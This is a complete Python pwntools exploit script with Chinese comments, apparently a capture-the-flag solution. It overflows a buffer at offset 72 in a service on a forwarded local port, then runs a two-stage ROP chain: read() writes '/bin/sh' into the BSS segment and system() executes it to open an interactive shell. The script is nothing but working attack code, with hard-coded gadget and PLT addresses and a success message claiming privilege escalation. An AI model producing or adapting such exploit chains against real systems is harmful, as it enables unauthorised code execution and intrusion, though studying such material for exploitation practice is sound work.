```python
from pwn import *

context.arch = 'amd64'

# 连接本地转发端口
p = remote('127.0.0.1', 9999)

# --- 地址配置 ---
offset = 72
bss_addr = 0x404110
read_plt = 0x4010a0
system_plt = 0x401050
pop_rdi = 0x401246
pop_rsi_r15 = 0x4014e9
ret = 0x401016

# --- 构造 Payload ---

# 第一阶段：调用 read(0, bss_addr, [rdx]) 写入 "/bin/sh"
# 注意：这里我们省略了 rdx，直接靠 read 调用时残留在寄存器里的值
payload = b'A' * offset

# 设置 read 的参数
payload += p64(pop_rdi)
payload += p64(0)          # fd = 0 (stdin)
payload += p64(pop_rsi_r15)
payload += p64(bss_addr)   # buf = bss
payload += p64(0)          # 填充给 r15 的垃圾数据
payload += p64(read_plt)

# 第二阶段：调用 system(bss_addr)
payload += p64(ret)        # 栈对齐
payload += p64(pop_rdi)
payload += p64(bss_addr)   # 参数指向我们刚才写的 /bin/sh
payload += p64(system_plt)

# --- 发送攻击 ---
log.info("发送 ROP 链以注入 /bin/sh...")
p.recvuntil("Access Code: ")
p.send(payload) # 注意：这里用 send 而不是 sendline，防止干扰后续输入

# 此时 read 函数正在等待输入，我们发送 8 字节的 /bin/sh
log.info("正在向 BSS 段写入字符串...")
p.send(b"/bin/sh\x00")

log.success("提权成功！")
p.interactive()
```
